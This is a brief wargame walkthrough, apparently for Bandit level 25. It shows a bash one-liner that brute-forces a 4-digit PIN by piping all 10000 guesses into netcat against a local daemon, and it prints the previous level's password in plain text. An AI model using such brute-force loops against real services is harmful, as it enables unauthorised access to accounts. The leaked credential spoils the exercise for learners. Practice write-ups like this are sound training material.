# Level 25

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

Though this could look nicer as a script, it can be set up as a one-liner:
```for N in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $N"; done | nc localhost 30002```

Remember to pipe into `netcat` *after* generating the lines, if you call nc for each line it will take a lot longer.
